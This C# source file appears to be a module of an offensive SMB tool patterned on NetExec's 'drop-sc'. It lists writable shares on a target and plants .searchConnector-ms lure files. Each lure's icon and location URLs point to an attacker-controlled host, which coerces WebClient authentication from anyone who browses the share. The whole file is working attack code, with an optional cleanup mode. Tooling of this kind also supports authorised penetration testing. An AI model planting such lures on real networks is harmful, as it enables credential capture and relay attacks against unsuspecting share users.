using Titanis;
using System.Text;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec drop-sc: drops .searchConnector-ms coercion lures on writable shares.
/// Options: URL=<attacker url>, FILENAME=<name>, SHARE=<only this>, CLEANUP=True.
/// </summary>
public sealed class SmbDropScModule : AtlasModule<Smb2Client>
{
	public override string Name => "drop-sc";
	public override string Description => "Drops .searchConnector-ms WebClient coercion lures (URL=..., FILENAME=..., SHARE=..., CLEANUP=True)";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		string url = ctx.Option("URL", "https://rickroll");
		string filename = ctx.Option("FILENAME", "Documents");
		string onlyShare = ctx.Option("SHARE", "");
		bool cleanup = ctx.Option("CLEANUP", "").Equals("True", StringComparison.OrdinalIgnoreCase);
		string name = $"{filename}.searchConnector-ms";
		try
		{
			string xml = $"<?xml version=\"1.0\" encoding=\"UTF-8\"?><searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\"><description>Microsoft Outlook</description><isSearchOnlyItem>false</isSearchOnlyItem><includeInStartMenuScope>true</includeInStartMenuScope><iconReference><URL>{url}/0001.ico</URL></iconReference><templateInfo><folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType></templateInfo><simpleLocation><url>{url}</url></simpleLocation></searchConnectorDescription>";
			byte[] content = Encoding.UTF8.GetBytes(xml);
			var ignore = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "C$", "ADMIN$" };
			var shares = await SmbDropHelper.WritableSharesAsync(ctx, ignore, cancellationToken).ConfigureAwait(false);
			if (!string.IsNullOrEmpty(onlyShare))
				shares = shares.Where(s => s.Equals(onlyShare, StringComparison.OrdinalIgnoreCase)).ToList();
			foreach (var share in shares)
			{
				cancellationToken.ThrowIfCancellationRequested();
				try
				{
					if (cleanup)
					{
						try { await ctx.Client.DeleteFileAsync(new Titanis.UncPath(ctx.Host, share, name), cancellationToken).ConfigureAwait(false); AtlasConsole.Success($"{ctx.Host}:445", $"(drop-sc) cleaned \\\\{ctx.Host}\\{share}\\{name}"); }
						catch { AtlasConsole.Info($"{ctx.Host}:445", $"(drop-sc) nothing to clean on {share}"); }
					}
					else
					{
						await SmbDropHelper.PutAsync(ctx, share, name, content, cancellationToken).ConfigureAwait(false);
						AtlasConsole.Success($"{ctx.Host}:445", $"(drop-sc) dropped \\\\{ctx.Host}\\{share}\\{name} -> {url}");
					}
				}
				catch (Exception ex) { AtlasConsole.Warn($"{ctx.Host}:445", $"(drop-sc) {share}: {ex.Message}"); }
			}
			if (shares.Count == 0) AtlasConsole.Info($"{ctx.Host}:445", "(drop-sc) no writable shares found");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(drop-sc) Failed: {ex.Message}");
		}
	}
}
